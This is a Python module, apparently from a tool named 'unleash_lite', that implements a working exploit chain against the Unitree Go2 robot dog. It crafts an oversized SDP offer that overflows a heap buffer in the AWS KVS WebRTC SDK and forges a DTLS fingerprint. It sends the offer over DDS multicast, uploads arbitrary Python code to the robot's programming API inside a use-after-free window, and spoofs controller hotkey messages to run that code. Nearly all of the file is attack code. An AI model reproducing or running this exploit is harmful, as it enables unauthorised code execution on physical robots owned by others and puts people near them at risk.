"""
SDP overflow connection for Unitree Go2.

Bypasses HTTP signaling (port 9991) entirely by delivering a crafted SDP
offer via DDS multicast. Exploits a heap buffer overflow in
parseMediaAttributes() (AWS KVS WebRTC SDK < v1.18.1) to inject a forged
DTLS fingerprint into the robot's PeerConnection.

Requires: cyclonedds==0.10.2 (must match robot's CycloneDDS version;
v0.11+ has incompatible SEDP)
"""

import asyncio
import json
import logging
import os
import re
import tempfile
import time

from aiortc import (
    RTCConfiguration, RTCPeerConnection, RTCSessionDescription,
)

from .webrtc import _validation_response

logger = logging.getLogger("unleash_lite.webrtc_sdp")


def build_e2_sdp(our_fingerprint_hash, our_ice_ufrag, our_ice_pwd,
                  our_candidates):
    """Build the E2 overflow SDP.

    The SDP has 5 media descriptions:
      MD0  m=fingerprint  — injection target, carries our forged hash in i= line
      MD1-3  m=video      — minimal padding
      MD4  m=application  — data channel + 251 padding attrs + 1 overflow attr

    The overflow attr (256th in MD4) has a 522-byte name: 520x'A' + 0x01 0x01.
    Bytes 520-521 land on sessionAttributesCount (UINT16 LE), corrupting it
    to 257 (0x0101). The session attribute loop then reads index 256, which
    maps to MD0.mediaName="fingerprint" and MD0.mediaTitle[8]=our hash.
    Post-loop, PC+0xc4255 = our fingerprint.

    Args:
        our_fingerprint_hash: SHA-256 colon-hex (WITHOUT "sha-256 " prefix)
        our_ice_ufrag: ICE username fragment from local description
        our_ice_pwd: ICE password from local description
        our_candidates: ICE candidate strings (without "a=" prefix)

    Returns:
        SDP string with CRLF line endings containing raw 0x01 bytes.
    """
    safe_fp = ("sha-256 4A:AD:B9:B1:3C:82:CB:D4:8D:4F:40:58:5C:C8:49:71:"
               "19:F4:B6:B1:34:71:22:B5:36:9B:8F:D2:3E:AA:33:53")
    overflow_name = "A" * 520 + "\x01\x01"

    lines = []
    lines.append("v=0")
    lines.append("o=- 3456789012 1 IN IP4 0.0.0.0")
    lines.append("s=-")
    lines.append("t=0 0")
    lines.append(f"a=fingerprint:{safe_fp}")
    lines.append("a=group:BUNDLE 0 1 2 3 4")

    # MD0: fingerprint injection target
    lines.append("m=fingerprint")
    lines.append(f"i=sha-256 {our_fingerprint_hash}")
    lines.append("c=IN IP4 0.0.0.0")
    lines.append(f"a=ice-ufrag:{our_ice_ufrag}")
    lines.append(f"a=ice-pwd:{our_ice_pwd}")
    lines.append("a=setup:actpass")
    lines.append("a=mid:0")

    for i in range(1, 4):
        lines.append("m=video 9 UDP/TLS/RTP/SAVPF 96")
        lines.append(f"a=ice-ufrag:{our_ice_ufrag}")
        lines.append(f"a=ice-pwd:{our_ice_pwd}")
        lines.append(f"a=mid:{i}")

    # MD4: data channel + padding to reach 255 attrs + overflow attr
    lines.append("m=application 9 UDP/DTLS/SCTP webrtc-datachannel")
    lines.append(f"a=ice-ufrag:{our_ice_ufrag}")
    lines.append(f"a=ice-pwd:{our_ice_pwd}")
    lines.append("a=mid:4")
    for cand in our_candidates:
        lines.append(f"a={cand}")

    n_real_attrs = 3 + len(our_candidates)
    n_padding = 255 - n_real_attrs
    for i in range(n_padding):
        lines.append(f"a=pad{i:03d}:x")

    lines.append(f"a={overflow_name}:overflow")
    return "\r\n".join(lines) + "\r\n"


def rewrite_answer_for_aiortc(answer_sdp):
    """Strip video sections from the robot's answer, keep application only.

    The robot answers our 5-MD offer with 2 media lines (video mid:0 +
    application mid:1). aiortc's local description has 1 media line
    (application mid:0). Renumber mid:1 -> mid:0 to match.
    """
    lines = answer_sdp.strip().split("\r\n")
    session_lines = []
    media_sections = []
    current_media = None

    for line in lines:
        if line.startswith("m="):
            if current_media is not None:
                media_sections.append(current_media)
            current_media = [line]
        elif current_media is not None:
            current_media.append(line)
        else:
            session_lines.append(line)
    if current_media is not None:
        media_sections.append(current_media)

    app_section = None
    for section in media_sections:
        if section[0].startswith("m=application"):
            app_section = section
            break

    if not app_section:
        raise ValueError("No m=application section in answer SDP")

    new_session = []
    for line in session_lines:
        if line.startswith("a=group:BUNDLE"):
            new_session.append("a=group:BUNDLE 0")
        else:
            new_session.append(line)

    new_app = []
    for line in app_section:
        if line.startswith("a=mid:"):
            new_app.append("a=mid:0")
        else:
            new_app.append(line)

    return "\r\n".join(new_session + new_app) + "\r\n"


def _sdp_to_dds_json(sdp):
    """Build DDS JSON payload preserving raw 0x01 bytes.

    json.dumps() escapes 0x01 to \\u0001 which the robot's parser handles
    differently. Build JSON manually so raw bytes pass through.
    """
    escaped = sdp.replace("\\", "\\\\").replace('"', '\\"')
    escaped = escaped.replace("\r", "\\r").replace("\n", "\\n")
    return ('{"sdp":"' + escaped + '",'
            '"id":"STA_localNetwork",'
            '"type":"offer",'
            '"token":""}')


def _detect_interface_ip():
    import socket
    for target in ("192.168.123.161", "192.168.12.1"):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect((target, 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except Exception:
            continue
    return None


# ---------------------------------------------------------------------------
# CycloneDDS helpers
# ---------------------------------------------------------------------------

def _import_cyclonedds():
    try:
        from cyclonedds.domain import DomainParticipant
        from cyclonedds.topic import Topic
        from cyclonedds.pub import DataWriter
        from cyclonedds.sub import DataReader
        return DomainParticipant, Topic, DataWriter, DataReader
    except ImportError:
        raise ImportError(
            "cyclonedds==0.10.2 is required for SDP mode.\n"
            "Install: pip install 'unleash-lite[sdp]'  "
            "or: pip install cyclonedds==0.10.2")


def _get_string_type():
    try:
        from std_msgs.msg.dds_ import String_
        return String_
    except ImportError:
        from dataclasses import dataclass as _dc
        from cyclonedds.idl import IdlStruct

        @_dc
        class String_(IdlStruct, typename="std_msgs.msg.dds_.String_"):
            data: str
        return String_


def _get_wireless_controller_type():
    try:
        from unitree_go.msg.dds_ import WirelessController_
        return WirelessController_
    except ImportError:
        from dataclasses import dataclass as _dc
        from cyclonedds.idl import IdlStruct
        from cyclonedds.idl import types

        @_dc
        class WirelessController_(
            IdlStruct,
            typename="unitree_go.msg.dds_.WirelessController_",
        ):
            lx: types.float32
            ly: types.float32
            rx: types.float32
            ry: types.float32
            keys: types.uint16
        return WirelessController_


def _init_dds(interface_ip):
    """Create a DomainParticipant bound to the given interface. Blocking."""
    xml = (f'<CycloneDDS><Domain><General>'
           f'<NetworkInterfaceAddress>{interface_ip}</NetworkInterfaceAddress>'
           f'</General></Domain></CycloneDDS>')
    cfg = tempfile.NamedTemporaryFile(mode="w", suffix=".xml", delete=False)
    cfg.write(xml)
    cfg.close()
    os.environ["CYCLONEDDS_URI"] = f"file://{cfg.name}"

    DomainParticipant = _import_cyclonedds()[0]
    dp = DomainParticipant(0)
    # Store config path for cleanup
    dp._unleash_cfg_path = cfg.name
    return dp


# Button bitmask values from physical_remote_controller.py
BUTTON_R1 = 1
BUTTON_L1 = 2
BUTTON_L2 = 32
BUTTON_A = 256
BUTTON_B = 512
BUTTON_Y = 2048

HOTKEY_KEYS = {
    "L1+Y": BUTTON_L1 | BUTTON_Y,   # 2050
    "L2+Y": BUTTON_L2 | BUTTON_Y,   # 2080
    "R1+Y": BUTTON_R1 | BUTTON_Y,   # 2049
}


# ---------------------------------------------------------------------------
# DDS operations
# ---------------------------------------------------------------------------

def _dds_exchange(dds_json, interface_ip):
    """Publish overflow SDP via DDS multicast, poll for answer. Blocking."""
    _, Topic, DataWriter, DataReader = _import_cyclonedds()
    String_ = _get_string_type()

    dp = _init_dds(interface_ip)
    try:
        writer = DataWriter(dp, Topic(dp, "rt/webrtcreq", String_))
        reader = DataReader(dp, Topic(dp, "rt/webrtcres", String_))

        time.sleep(3)

        logger.debug("Publishing overflow SDP via DDS (%d bytes)", len(dds_json))
        writer.write(String_(data=dds_json))

        # Poll — do NOT use WaitSet/ReadCondition (segfaults on 0.10.2)
        deadline = time.time() + 15
        seen = set()
        while time.time() < deadline:
            time.sleep(0.3)
            for s in reader.read(N=10):
                if s.data and s.data not in seen:
                    seen.add(s.data)
                    try:
                        answer = json.loads(s.data)
                        sdp = answer.get("sdp", "")
                        if sdp and "m=application" in sdp:
                            return sdp
                    except json.JSONDecodeError:
                        continue
        return None
    finally:
        try:
            os.unlink(dp._unleash_cfg_path)
        except (OSError, AttributeError):
            pass


def dds_trigger_hotkey(interface_ip, hotkey="L1+Y", hold_secs=0.3):
    """Publish a fake WirelessController_ message to trigger a hotkey.

    Sends a button-down message, waits hold_secs, then sends button-up.
    The programming_actuator reads rt/wirelesscontroller and fires the
    bound script when it sees the matching key combo.

    Blocking — meant to be called from a thread or via asyncio.to_thread.
    """
    keys = HOTKEY_KEYS.get(hotkey)
    if keys is None:
        raise ValueError(
            f"Unknown hotkey {hotkey!r}. "
            f"Valid: {', '.join(HOTKEY_KEYS)}")

    _, Topic, DataWriter, _ = _import_cyclonedds()
    WC_ = _get_wireless_controller_type()

    dp = _init_dds(interface_ip)
    try:
        writer = DataWriter(
            dp, Topic(dp, "rt/wirelesscontroller", WC_))

        time.sleep(3)

        logger.debug("Sending fake controller: %s (keys=%d)", hotkey, keys)
        writer.write(WC_(lx=0.0, ly=0.0, rx=0.0, ry=0.0, keys=keys))
        time.sleep(hold_secs)
        writer.write(WC_(lx=0.0, ly=0.0, rx=0.0, ry=0.0, keys=0))
        logger.debug("Controller trigger sent")
    finally:
        try:
            os.unlink(dp._unleash_cfg_path)
        except (OSError, AttributeError):
            pass


class Go2DataChannelSDP:
    """WebRTC data channel via SDP overflow + DDS multicast.

    The UAF constraint (~1-2s after DTLS) means validation + upload must
    fire immediately in the message handler. Call connect_and_fire() with
    the payload — it returns after the upload completes or the connection
    dies, whichever comes first.
    """

    def __init__(self, interface_ip=None):
        self.interface_ip = (
            interface_ip
            or os.environ.get("DDS_MC_INTERFACE")
            or _detect_interface_ip()
        )
        self._pc = None
        self._dc = None
        self._upload_result = None
        self._upload_done = asyncio.Event()

    async def connect_and_fire(self, payload, timeout=30.0):
        """Full SDP overflow flow: connect + validate + upload in one shot.

        Returns (success, status_code, response_data).
        success is None if the connection died before a response arrived
        (upload was sent but unconfirmed).
        """
        if not self.interface_ip:
            raise ConnectionError(
                "Cannot detect network interface for DDS multicast. "
                "Set DDS_MC_INTERFACE or pass --interface-ip.")

        # No STUN/TURN — we're on an isolated LAN. Host candidates only.
        # This makes ICE gathering < 1s instead of ~15s (no STUN retries
        # to unreachable Google servers), leaving plenty of time for the
        # DDS exchange before the PC times out.
        config = RTCConfiguration(iceServers=[])

        self._pc = RTCPeerConnection(config)
        self._dc = self._pc.createDataChannel("data")

        offer = await self._pc.createOffer()
        await self._pc.setLocalDescription(offer)
        for _ in range(60):
            if self._pc.iceGatheringState == "complete":
                break
            await asyncio.sleep(0.25)

        local_sdp = self._pc.localDescription.sdp
        logger.debug("ICE gathering: %s", self._pc.iceGatheringState)

        fp_match = re.search(
            r"a=fingerprint:sha-256 ([0-9A-Fa-f:]+)", local_sdp)
        ufrag_match = re.search(r"a=ice-ufrag:(\S+)", local_sdp)
        pwd_match = re.search(r"a=ice-pwd:(\S+)", local_sdp)
        candidates = re.findall(
            r"(candidate:\S+ \d+ \S+ \d+ [\d.]+ \d+ typ \S+.*)", local_sdp)

        if not all([fp_match, ufrag_match, pwd_match]):
            raise ConnectionError(
                "Failed to extract ICE parameters from local SDP")

        fp_hash = fp_match.group(1)
        ufrag = ufrag_match.group(1)
        pwd = pwd_match.group(1)

        logger.debug("Fingerprint: sha-256 %s", fp_hash)
        logger.debug("ICE: ufrag=%s candidates=%d", ufrag, len(candidates))

        overflow_sdp = build_e2_sdp(fp_hash, ufrag, pwd, candidates)
        dds_json = _sdp_to_dds_json(overflow_sdp)

        self._setup_handlers(payload)

        answer_sdp = await asyncio.to_thread(
            _dds_exchange, dds_json, self.interface_ip)
        if not answer_sdp:
            raise ConnectionError("No answer received from robot via DDS")

        rewritten = rewrite_answer_for_aiortc(answer_sdp)
        logger.debug("Rewritten answer:\n%s", rewritten[:500])

        await self._pc.setRemoteDescription(
            RTCSessionDescription(sdp=rewritten, type="answer"))

        try:
            await asyncio.wait_for(self._upload_done.wait(), timeout=timeout)
        except asyncio.TimeoutError:
            raise ConnectionError(
                "Timed out waiting for upload confirmation. The UAF may have "
                "killed the connection before the upload completed.")

        return self._upload_result

    def _setup_handlers(self, payload):
        dc = self._dc
        pc = self._pc
        subscribed = False
        upload_sent = False

        def _req_id():
            import random
            return int(time.time() * 1000) % 2147483648 + random.randint(
                0, 1000)

        @dc.on("message")
        def on_message(raw):
            nonlocal subscribed, upload_sent
            try:
                msg = (json.loads(raw) if isinstance(raw, str)
                       else json.loads(raw.decode()))
            except Exception:
                return

            logger.debug("DC recv: %s", json.dumps(msg, indent=2)[:2000])

            # Go2 never completes DCEP handshake — force open
            if dc.readyState != "open":
                dc._setReadyState("open")

            msg_type = msg.get("type", "")
            data = msg.get("data", {})

            if msg_type == "validation":
                if data == "Validation Ok.":
                    logger.debug("Validation passed — firing upload")
                    upload_sent = True
                    rid = _req_id()
                    dc.send(json.dumps({
                        "type": "req",
                        "topic": "rt/api/programming_actuator/request",
                        "data": {
                            "header": {
                                "identity": {"id": rid, "api_id": 1002},
                            },
                            "parameter": json.dumps({
                                "program_content": {
                                    "chunk_index": 1,
                                    "total_chunk_num": 1,
                                    "chunk_content": payload.python_code,
                                },
                                "program_uuid": payload.program_uuid,
                                "bind_hotkey": payload.bind_hotkey,
                            }),
                        },
                    }))
                else:
                    # Subscribe before responding — gives robot time to
                    # process subscribe before validation completes
                    if not subscribed:
                        dc.send(json.dumps({
                            "type": "subscribe",
                            "topic":
                                "rt/api/programming_actuator/response",
                        }))
                        subscribed = True
                    resp = _validation_response(str(data))
                    try:
                        dc.send(json.dumps({
                            "type": "validation",
                            "topic": "",
                            "data": resp,
                        }))
                    except Exception as ex:
                        logger.error("Validation send error: %s", ex)

            elif msg_type in ("msg", "res") and upload_sent:
                if isinstance(data, dict):
                    status = data.get("header", {}).get(
                        "status", {}).get("code", -1)
                    self._upload_result = (status == 0, status, data)
                    self._upload_done.set()

        @dc.on("close")
        def on_dc_close():
            logger.debug("Data channel closed")
            if not self._upload_done.is_set():
                self._upload_result = (
                    None if upload_sent else False, -1, None)
                self._upload_done.set()

        @pc.on("connectionstatechange")
        def on_conn():
            logger.debug("Connection state: %s", pc.connectionState)
            if pc.connectionState in ("failed", "closed"):
                if not self._upload_done.is_set():
                    self._upload_result = (
                        None if upload_sent else False, -1, None)
                    self._upload_done.set()

    async def close(self):
        if self._pc:
            await self._pc.close()
            self._pc = None
